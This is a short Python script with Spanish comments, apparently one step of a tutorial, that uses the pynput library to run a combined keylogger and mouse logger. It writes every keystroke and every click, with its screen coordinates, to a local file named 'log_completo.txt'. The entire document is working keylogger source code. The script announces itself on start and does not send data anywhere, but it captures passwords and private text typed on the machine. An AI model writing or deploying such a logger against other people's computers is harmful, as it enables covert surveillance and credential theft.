# Importamos las clases necesarias tanto del teclado como del ratón
from pynput import keyboard, mouse

# --- Función para el teclado (la misma de antes) ---
def on_press(key):
    with open("log_completo.txt", "a") as f:
        try:
            f.write(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                f.write(' ')
            elif key == keyboard.Key.enter:
                f.write('\n')
            else:
                f.write(f' [{str(key)}] ')

# --- Función para los clics del ratón (la misma de antes) ---
def on_click(x, y, button, pressed):
    if pressed:
        with open("log_completo.txt", "a") as f:
            f.write(f'\n[CLIC: {button} en (X:{x}, Y:{y})]\n')

# --- Creamos e iniciamos ambos listeners ---

print("Keylogger y Mouse-logger iniciados. Registrando toda la actividad...")
print("Los datos se guardarán en 'log_completo.txt'")

# Creamos una instancia para cada uno, pero no usamos 'with' esta vez
keyboard_listener = keyboard.Listener(on_press=on_press)
mouse_listener = mouse.Listener(on_click=on_click)

# Iniciamos ambos listeners
keyboard_listener.start()
mouse_listener.start()

# Los mantenemos vivos
keyboard_listener.join()
mouse_listener.join()